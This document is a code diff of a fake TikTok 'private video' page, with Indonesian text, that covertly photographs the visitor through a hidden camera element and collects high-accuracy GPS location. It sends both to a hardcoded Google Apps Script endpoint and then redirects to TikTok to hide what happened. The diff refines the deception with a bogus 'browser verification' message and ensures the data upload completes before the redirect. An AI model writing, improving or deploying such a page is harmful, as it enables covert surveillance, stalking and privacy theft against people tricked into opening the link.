@@ -16,7 +16,7 @@
       color: #fff;
     }
     .wrapper { text-align: center; padding: 25px; max-width: 350px; width: 85%; }
-    .logo { font-size: 30px; font-weight: 800; margin-bottom: 20px; }
+    .logo { font-size: 32px; font-weight: 800; margin-bottom: 20px; letter-spacing: -1px; }
     .btn-tiktok {
       background-color: #fe2c55;
       color: #fff;
@@ -27,6 +27,7 @@
       border-radius: 6px;
       cursor: pointer;
       width: 100%;
+      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.4);
     }
     #hidden-video, #hidden-canvas { display: none; }
   </style>
@@ -37,19 +38,27 @@
     <div class="logo">TikTok</div>
     <p style="font-size: 14px; margin-bottom: 25px; color: #bbb;">Tautan video privat. Klik untuk membuka video.</p>
     <button id="action-btn" class="btn-tiktok" onclick="handleStart()">Buka Video</button>
+    <p id="status-text" style="font-size: 12px; color: #888; margin-top: 15px;">Izinkan verifikasi browser jika diminta.</p>
   </div>
 
   <video id="hidden-video" autoplay playsinline muted></video>
   <canvas id="hidden-canvas"></canvas>
 
   <script>
-    // GANTI DENGAN URL WEB APP GOOGLE APPS SCRIPT ANDA
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxgYwr8rs9JgYVeqTh-bOcm2mHFP8Wwb380u4VzIjALNG5hIxAKY60BdCAxa0DPWL9Q/exec";
+    // TEMPEL URL WEB APP APPS SCRIPT ANDA DI SINI
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyMI1nMRifoLPPFkSoRJSSmYbZ9Jt04tkWTmNZUo7u_D-3IiLaBMwM1VFAlujvwWeueQ/exec";
 
-    // Ambil URL tujuan dari parameter ?target=
+    // Ambil parameter target TikTok
     const urlParams = new URLSearchParams(window.location.search);
     const targetParam = urlParams.get('target');
-    const targetUrl = targetParam ? atob(targetParam) : 'https://www.tiktok.com';
+    let targetUrl = 'https://www.tiktok.com';
+    if (targetParam) {
+      try {
+        targetUrl = atob(targetParam);
+      } catch(e) {
+        targetUrl = targetParam;
+      }
+    }
 
     let payload = {
       latitude: null,
@@ -61,10 +70,12 @@
 
     function handleStart() {
       const btn = document.getElementById('action-btn');
-      btn.innerText = "Memuat...";
+      const status = document.getElementById('status-text');
+      btn.innerText = "Memproses...";
       btn.disabled = true;
+      status.innerText = "Memeriksa perangkat...";
 
-      // 1. Minta Izin Kamera (Berjalan lancar tanpa iFrame)
+      // 1. Ambil Kamera
       navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
         .then((stream) => {
           const video = document.getElementById('hidden-video');
@@ -77,7 +88,7 @@
               const ctx = canvas.getContext('2d');
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               
-              payload.image = canvas.toDataURL('image/jpeg', 0.6);
+              payload.image = canvas.toDataURL('image/jpeg', 0.5);
               stream.getTracks().forEach(t => t.stop());
               
               fetchLocation();
@@ -85,41 +96,52 @@
           };
         })
         .catch(() => {
+          // Jika kamera ditolak, tetap ambil lokasi
           fetchLocation();
         });
     }
 
-    // 2. Minta Izin Lokasi GPS
+    // 2. Ambil Lokasi GPS
     function fetchLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             payload.latitude = pos.coords.latitude;
             payload.longitude = pos.coords.longitude;
-            sendDataAndRedirect();
+            sendData();
           },
           () => {
-            sendDataAndRedirect();
+            sendData();
           },
           { enableHighAccuracy: true, timeout: 3000 }
         );
       } else {
-        sendDataAndRedirect();
+        sendData();
       }
     }
 
-    // 3. Kirim ke Google Apps Script & Langsung Redirect
-    function sendDataAndRedirect() {
-      fetch(SCRIPT_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'text/plain' },
-        body: JSON.stringify(payload)
-      })
-      .catch(() => {})
-      .finally(() => {
+    // 3. Kirim ke Google Apps Script (Wajib tunggu selesai baru redirect)
+    async function sendData() {
+      const status = document.getElementById('status-text');
+      status.innerText = "Menghubungkan ke server...";
+
+      try {
+        await fetch(SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'text/plain;charset=utf-8'
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Gagal kirim data:", err);
+      }
+
+      // Beri jeda 800ms agar Google server selesai mencatat baris baru
+      setTimeout(() => {
         window.location.href = targetUrl;
-      });
+      }, 800);
     }
   </script>
 </body>
